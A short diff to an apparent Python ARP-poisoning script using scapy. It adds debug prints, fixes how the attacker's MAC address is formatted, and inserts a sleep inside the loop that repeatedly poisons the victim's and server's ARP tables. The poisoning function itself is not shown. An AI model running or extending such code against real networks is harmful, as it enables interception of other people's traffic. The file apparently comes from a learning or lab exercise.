@@ -10,6 +10,7 @@ import argparse
 import uuid
 import libpcap
 import scapy.all as scapy
+import time
 
 
 def create_argument_parser():
@@ -349,10 +350,15 @@ if __name__ == "__main__":
     args = parser.parse_args(sys.argv[1:])
     print("Estos son mis argumentos ", args)
     hostname = socket.gethostname()
+    
     att_hex = hex(uuid.getnode())                      # Attackant
+    att_hex = att_hex[0:2] +'0'+ att_hex[2:]
+    print("node=", uuid.getnode())
+    print("att_hex=",att_hex, "len=",len(att_hex))
     att_aux=''
     for n in range(2,len(att_hex), 2):
         att_aux = att_aux + att_hex[n: n+2] +':'
+    print("att_aux=",att_aux)
     att_mac = att_aux[:-1]
     print(att_mac)    
     att_ip = socket.gethostbyname(hostname)
@@ -377,7 +383,7 @@ if __name__ == "__main__":
         poison_tables(att_mac=att_mac, att_ip=att_ip,        # Attackant MAC & IP
                      sou_mac=sou_mac, sou_ip=sou_ip,        # server MAC & IP
                      des_mac=des_mac, des_ip=des_ip)        # vistim MAC & IP
-
+        time.sleep(2)
 
 
 
